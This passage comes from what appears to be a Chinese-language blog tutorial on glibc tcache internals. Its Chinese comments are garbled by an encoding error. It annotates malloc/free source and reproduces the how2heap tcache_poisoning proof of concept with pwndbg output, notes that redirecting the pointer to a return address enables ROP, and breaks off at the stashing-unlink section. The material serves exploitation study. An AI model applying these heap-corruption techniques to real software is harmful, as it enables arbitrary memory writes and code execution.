<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">while</span> ((victim = unsorted_chunks(av)-&gt;bk) != unsorted_chunks(av))<span class="comment">//æ¯æ¬¡æ‹¿å‡ºä¸€ä¸ªå †å—äº¤ç»™victim</span></span><br><span class="line">    &#123;</span><br><span class="line">      bck = victim-&gt;bk;</span><br><span class="line">      <span class="keyword">if</span> (__builtin_expect(chunksize_nomask(victim) &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>) || __builtin_expect(chunksize_nomask(victim) &gt; av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">        malloc_printerr(<span class="string">&quot;malloc(): memory corruption&quot;</span>);</span><br><span class="line">      size = chunksize(victim);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">         If a small request, try to use last remainder if it is the</span></span><br><span class="line"><span class="comment">         only chunk in unsorted bin.  This helps promote locality for</span></span><br><span class="line"><span class="comment">         runs of consecutive small requests. This is the only</span></span><br><span class="line"><span class="comment">         exception to best-fit, and applies only when there is</span></span><br><span class="line"><span class="comment">         no exact fit for a small chunk.</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (in_smallbin_range(nb) &amp;&amp;</span><br><span class="line">          bck == unsorted_chunks(av) &amp;&amp;</span><br><span class="line">          victim == av-&gt;last_remainder &amp;&amp;</span><br><span class="line">          (<span class="type">unsigned</span> <span class="type">long</span>)(size) &gt; (<span class="type">unsigned</span> <span class="type">long</span>)(nb + MINSIZE))</span><br><span class="line">      &#123;<span class="comment">//å¦‚æœæ˜¯last_remainderåˆ™ç›´æ¥åˆ†é…,æ­¤æ—¶ä¸ä¼šå†è¿›è¡Œtcacheç¼“å­˜,æ¨æµ‹åŸå› æ˜¯last_remainderåˆšç”¨è¿‡,è¿˜åœ¨å†…å­˜ä¸­,å‘½ä¸­æ¦‚ç‡å¤§</span></span><br><span class="line">        <span class="comment">/* split and reattach remainder */</span></span><br><span class="line">        remainder_size = size - nb;</span><br><span class="line">        remainder = chunk_at_offset(victim, nb);</span><br><span class="line">        unsorted_chunks(av)-&gt;bk = unsorted_chunks(av)-&gt;fd = remainder;</span><br><span class="line">        av-&gt;last_remainder = remainder;</span><br><span class="line">        remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks(av);</span><br><span class="line">        <span class="keyword">if</span> (!in_smallbin_range(remainder_size))</span><br><span class="line">        &#123;</span><br><span class="line">          remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">          remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        set_head(victim, nb | PREV_INUSE |</span><br><span class="line">                             (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">        set_head(remainder, remainder_size | PREV_INUSE);</span><br><span class="line">        set_foot(remainder, remainder_size);</span><br><span class="line"></span><br><span class="line">        check_malloced_chunk(av, victim, nb);</span><br><span class="line">        <span class="type">void</span> *p = chunk2mem(victim);</span><br><span class="line">        alloc_perturb(p, bytes);</span><br><span class="line">        <span class="keyword">return</span> p;</span><br><span class="line">      &#125;</span><br><span class="line">	<span class="comment">//ä¸æ˜¯last_remainder</span></span><br><span class="line">      <span class="comment">/* remove from unsorted list */</span></span><br><span class="line">      unsorted_chunks(av)-&gt;bk = bck;<span class="comment">//æŠŠvictimæ‹†ä¸‹æ¥</span></span><br><span class="line">      bck-&gt;fd = unsorted_chunks(av);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Take now instead of binning if exact fit */</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (size == nb)<span class="comment">//å¦‚æœå½“å‰å †å—çš„å¤§å°ç¬¦åˆè¦æ±‚,ä¸ä¼šç«‹åˆ»åˆ†é…,é¦–å…ˆåº”è¯¥æ”¾åˆ°tcacheä¸­</span></span><br><span class="line">      &#123;</span><br><span class="line">        set_inuse_bit_at_offset(victim, size);</span><br><span class="line">        <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">          set_non_main_arena(victim);</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">        <span class="comment">/* Fill cache first, return to user only if cache fills.</span></span><br><span class="line"><span class="comment">     We may return one of these chunks later.  */</span></span><br><span class="line">        <span class="keyword">if</span> (tcache_nb &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)</span><br><span class="line">        &#123;</span><br><span class="line">          tcache_put(victim, tc_idx);</span><br><span class="line">          return_cached = <span class="number">1</span>;<span class="comment">//è®°å½•è‡³å°‘æœ‰ä¸€ä¸ªå †å—æ”¾åˆ°äº†tcache,å¾…ä¼šå„¿å°±å¯ä»¥ä»tcacheä¸­æ‹¿å †å—äº†</span></span><br><span class="line">          <span class="keyword">continue</span>;	<span class="comment">//continueç›´æ¥è·³åˆ°whileä¸€å¼€å§‹æ‹¿ä¸‹ä¸€ä¸ªå †å—äº†</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span><span class="comment">//ç›´åˆ°å¯¹åº”tcacheå­˜æ»¡äº†æ‰ä¼šç›´æ¥è¿›è¡Œåˆ†é…</span></span><br><span class="line">        &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">          check_malloced_chunk(av, victim, nb);</span><br><span class="line">          <span class="type">void</span> *p = chunk2mem(victim);</span><br><span class="line">          alloc_perturb(p, bytes);</span><br><span class="line">          <span class="keyword">return</span> p;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">        &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      &#125;</span><br><span class="line">		<span class="comment">//åˆ°æ­¤è¯´æ˜victimæ—¢ä¸æ˜¯last_remainder,å¤§å°ä¹Ÿä¸æ˜¯æ­£åˆé€‚</span></span><br><span class="line">      <span class="comment">/* place chunk in bin */</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (in_smallbin_range(size))<span class="comment">//å¦‚æœvictimæ˜¯smallbinèŒƒå›´çš„</span></span><br><span class="line">      &#123;</span><br><span class="line">        victim_index = smallbin_index(size);<span class="comment">//æ”¾è¿›smallbin</span></span><br><span class="line">        bck = bin_at(av, victim_index);</span><br><span class="line">        fwd = bck-&gt;fd;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span><span class="comment">//å¦åˆ™è¯´æ˜æ˜¯largebinä¸­çš„,æ”¾åˆ°largebin,ä¸ä¼šè¿›å…¥smallbin</span></span><br><span class="line">      &#123;</span><br><span class="line">        victim_index = largebin_index(size);</span><br><span class="line">        bck = bin_at(av, victim_index);</span><br><span class="line">        fwd = bck-&gt;fd;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* maintain large bins in sorted order */</span></span><br><span class="line">        <span class="keyword">if</span> (fwd != bck)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="comment">/* Or with inuse bit to speed comparisons */</span></span><br><span class="line">          size |= PREV_INUSE;</span><br><span class="line">          <span class="comment">/* if smaller than smallest, bypass loop below */</span></span><br><span class="line">          assert(chunk_main_arena(bck-&gt;bk));</span><br><span class="line">          <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>)(size) &lt; (<span class="type">unsigned</span> <span class="type">long</span>)chunksize_nomask(bck-&gt;bk))</span><br><span class="line">          &#123;</span><br><span class="line">            fwd = bck;</span><br><span class="line">            bck = bck-&gt;bk;</span><br><span class="line"></span><br><span class="line">            victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">            victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">            fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            assert(chunk_main_arena(fwd));</span><br><span class="line">            <span class="keyword">while</span> ((<span class="type">unsigned</span> <span class="type">long</span>)size &lt; chunksize_nomask(fwd))</span><br><span class="line">            &#123;</span><br><span class="line">              fwd = fwd-&gt;fd_nextsize;</span><br><span class="line">              assert(chunk_main_arena(fwd));</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>)size == (<span class="type">unsigned</span> <span class="type">long</span>)chunksize_nomask(fwd))</span><br><span class="line">              <span class="comment">/* Always insert in the second position.  */</span></span><br><span class="line">              fwd = fwd-&gt;fd;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">              victim-&gt;fd_nextsize = fwd;</span><br><span class="line">              victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">              fwd-&gt;bk_nextsize = victim;</span><br><span class="line">              victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">            &#125;</span><br><span class="line">            bck = fwd-&gt;bk;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      mark_bin(av, victim_index);</span><br><span class="line">      victim-&gt;bk = bck;</span><br><span class="line">      victim-&gt;fd = fwd;</span><br><span class="line">      fwd-&gt;bk = victim;</span><br><span class="line">      bck-&gt;fd = victim;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">      <span class="comment">/* If we&#x27;ve processed as many chunks as we&#x27;re allowed while</span></span><br><span class="line"><span class="comment">   filling the cache, return one of the cached ones.  */</span></span><br><span class="line">      ++tcache_unsorted_count;<span class="comment">//unsortedbinä¸­æœ€å¤§å¯ä»¥å®¹å¿çš„ç¼“å­˜æ¬¡æ•°</span></span><br><span class="line">      <span class="keyword">if</span> (return_cached &amp;&amp; mp_.tcache_unsorted_limit &gt; <span class="number">0</span> &amp;&amp; tcache_unsorted_count &gt; mp_.tcache_unsorted_limit)</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">return</span> tcache_get(tc_idx);</span><br><span class="line">      &#125;<span class="comment">//ç»“ç®—é˜¶æ®µ,å¦‚æœreturn_cachedæ˜¯æ­£åˆé€‚å¤§å°çš„å †å—å…¥tcacheçš„æ ‡è®°,å¦‚æœè¢«ç½®1è¯´æ˜è‡³å°‘èƒ½ä»tcacheä¸­æ‰¾åˆ°ä¸€ä¸ªåˆé€‚çš„å †å—</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_ITERS 10000</span></span><br><span class="line">      <span class="keyword">if</span> (++iters &gt;= MAX_ITERS)</span><br><span class="line">        <span class="keyword">break</span>;<span class="comment">//unsortedbinè¿™é‡Œçš„å¾ªç¯æœ€å¤š10000æ¬¡</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>



<p>è·³å‡ºunsortedbinå¾ªç¯,å†æ£€æŸ¥ä¸€æ¬¡tcacheä¸­æ˜¯å¦æœ‰åˆé€‚å †å—</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">    <span class="comment">/* If all the small chunks we found ended up cached, return one now.  */</span></span><br><span class="line">    <span class="keyword">if</span> (return_cached)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">return</span> tcache_get(tc_idx);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>





<p>åé¢ä½¿ç”¨largebinå’Œtopchunkè¿›è¡Œåˆ†é…æ—¶ä¸ä¼šæœ‰tcacheçš„ç¼“å­˜ä½¿ç”¨äº†</p>
<h3 id="int-free"><a href="#int-free" class="headerlink" title="int_free"></a>int_free</h3><p>é‡Šæ”¾æ—¶çš„tcacheæ“ä½œå¾ˆç®€å•,åªåœ¨int_freeä¸­æœ‰ä¸€ä¸ª</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="type">size_t</span> tc_idx = csize2tidx(size);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)</span><br><span class="line">    &#123;</span><br><span class="line">      tcache_put(p, tc_idx);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>

<p>å¦‚æœè¿™å †å—çš„å¤§å°åœ¨tcacheçš„ç®¡ç†èŒƒå›´å†…,é‚£ä¹ˆåœ¨ä¸€åˆ‡é‡Šæ”¾å·¥ä½œå¼€å§‹ä¹‹å‰,é¦–å…ˆå°è¯•å°†è¿™ä¸ªå †å—æ”¾åˆ°tcacheä¸­</p>
<p>å¦‚æœç¼“å­˜åˆ™ç›´æ¥è¿”å›</p>
<h2 id="how2heap"><a href="#how2heap" class="headerlink" title="how2heap"></a>how2heap</h2><h3 id="tcache-poisoning"><a href="#tcache-poisoning" class="headerlink" title="tcache_poisoning"></a>tcache_poisoning</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">// disable buffering</span></span><br><span class="line">	setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">	setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;This file demonstrates a simple tcache poisoning attack by tricking malloc into\n&quot;</span></span><br><span class="line">		   <span class="string">&quot;returning a pointer to an arbitrary location (in this case, the stack).\n&quot;</span></span><br><span class="line">		   <span class="string">&quot;The attack is very similar to fastbin corruption attack.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;After the patch https://sourceware.org/git/?p=glibc.git;a=commit;h=77dc0d8643aa99c92bf671352b0a8adde705896f,\n&quot;</span></span><br><span class="line">		   <span class="string">&quot;We have to create and free one more chunk for padding before fd pointer hijacking.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="type">size_t</span> stack_var;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;The address we want malloc() to return is %p.\n&quot;</span>, (<span class="type">char</span> *)&amp;stack_var);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Allocating 2 buffers.\n&quot;</span>);</span><br><span class="line">	<span class="type">intptr_t</span> *a = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;malloc(128): %p\n&quot;</span>, a);</span><br><span class="line">	<span class="type">intptr_t</span> *b = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;malloc(128): %p\n&quot;</span>, b);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Freeing the buffers...\n&quot;</span>);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line">	<span class="built_in">free</span>(b);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Now the tcache list has [ %p -&gt; %p ].\n&quot;</span>, b, a);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;We overwrite the first %lu bytes (fd/next pointer) of the data at %p\n&quot;</span></span><br><span class="line">		   <span class="string">&quot;to point to the location to control (%p).\n&quot;</span>, <span class="keyword">sizeof</span>(<span class="type">intptr_t</span>), b, &amp;stack_var);</span><br><span class="line">	b[<span class="number">0</span>] = (<span class="type">intptr_t</span>)&amp;stack_var;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Now the tcache list has [ %p -&gt; %p ].\n&quot;</span>, b, &amp;stack_var);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;1st malloc(128): %p\n&quot;</span>, <span class="built_in">malloc</span>(<span class="number">128</span>));</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Now the tcache list has [ %p ].\n&quot;</span>, &amp;stack_var);</span><br><span class="line"></span><br><span class="line">	<span class="type">intptr_t</span> *c = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;2nd malloc(128): %p\n&quot;</span>, c);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;We got the control\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	assert((<span class="type">long</span>)&amp;stack_var == (<span class="type">long</span>)c);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä¸¤ä¸ªmallocç„¶åä¸¤ä¸ªfreeä¹‹å,ä¸¤ä¸ªå †å—å°±æ”¾åˆ°tcacheä¸­äº†</p>
<p>å¦‚æœæ²¡æœ‰tcache,è¿™ä¿©éƒ½åº”è¯¥æ”¾åœ¨fastbin</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x8403000</span></span><br><span class="line">Size: <span class="number">0x251</span></span><br><span class="line"></span><br><span class="line">Free <span class="title function_">chunk</span> <span class="params">(tcache)</span> | PREV_INUSE</span><br><span class="line">Addr: 0x8403250</span><br><span class="line">Size: 0x91</span><br><span class="line">fd: 0x00</span><br><span class="line"></span><br><span class="line">Free <span class="title function_">chunk</span> <span class="params">(tcache)</span> | PREV_INUSE</span><br><span class="line">Addr: 0x84032e0</span><br><span class="line">Size: 0x91</span><br><span class="line">fd: 0x8403260</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x8403370</span><br><span class="line">Size: 0x20c91</span><br><span class="line"></span><br><span class="line">pwndbg&gt; tcache</span><br><span class="line">&#123;</span><br><span class="line">  counts = <span class="string">&quot;\000\000\000\000\000\000\000\002&quot;</span>, <span class="string">&#x27;\000&#x27;</span> &lt;repeats <span class="number">55</span> times&gt;,</span><br><span class="line">  entries = &#123;<span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x84032f0</span>, <span class="number">0x0</span> &lt;repeats <span class="number">56</span> times&gt;&#125;</span><br><span class="line">&#125;</span><br><span class="line">pwndbg&gt; tcachebin</span><br><span class="line">tcachebins</span><br><span class="line"><span class="number">0x90</span> [  <span class="number">2</span>]: <span class="number">0x84032f0</span> â€”â–¸ <span class="number">0x8403260</span> â—‚â€” <span class="number">0x0</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">flowchart LR</span><br><span class="line">t[&quot;tcachebin[idx]&quot;]----&gt;b[&quot;b@0x84032f0&quot;]----&gt;a[&quot;a@0x8403260&quot;]----&gt;null</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>æ­¤æ—¶b[0]å°±æ˜¯å…¶æŒ‡å‘açš„nextæŒ‡é’ˆ,ç›´æ¥ä¿®æ”¹b[0]å°±å¯ä»¥ç©åtcache</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; tcachebins</span><br><span class="line">tcachebins</span><br><span class="line"><span class="number">0x90</span> [  <span class="number">2</span>]: <span class="number">0x84032f0</span> â€”â–¸ <span class="number">0x7ffffffedde8</span> â—‚â€” <span class="number">0x0</span></span><br></pre></td></tr></table></figure>



<p>è¿™å°±æŠŠæ ˆä¸Šçš„<code>stack_var@0x0x7ffffffedde8</code>è¿æ¥åˆ°tcacheä¸Šäº†</p>
<p>ä¸‹ä¸€æ¬¡åˆ†é…ä¼šæ‹¿èµ°b</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">flowchart LR</span><br><span class="line">t[&quot;tcachebin[idx]&quot;]----&gt;stack_var[&quot;stack_var@0x0x7ffffffedde8&quot;]----&gt;null</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>å†ä¸‹ä¸€æ¬¡åˆ†é…cå°±ä¼šæ‹¿èµ°stack_var</p>
<p>ä¹Ÿå°±æ˜¯è¯´cæŒ‡å‘<code>0x0x7ffffffedde8</code>è¿™ä¸ªåœ°å€</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p c</span><br><span class="line">$<span class="number">1</span> = (<span class="type">intptr_t</span> *) <span class="number">0x7ffffffedde8</span></span><br></pre></td></tr></table></figure>

<p>å¦‚æœæˆ‘ä»¬æŠŠ<code>b[0] = (intptr_t)&amp;stack_var;</code></p>
<p>æ”¹æˆ<code>b[0] = (intptr_t)&amp;rip;</code>ä¹Ÿå°±æ˜¯ç¯¡æ”¹äº†å‡½æ•°è¿”å›åœ°å€</p>
<p>ç„¶åå°±å¯ä»¥é€šè¿‡<code>c[0]=&amp;vuln_func</code>è¿›è¡ŒROPæ”»å‡»</p>
<h3 id="tcache-stashing-unlink-attack"><a href="#tcache-stashing-unlink-attack" class="headerlink" title="tcache_stashing_unlink_attack"></a>tcache_stashing_unlink_attack</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span 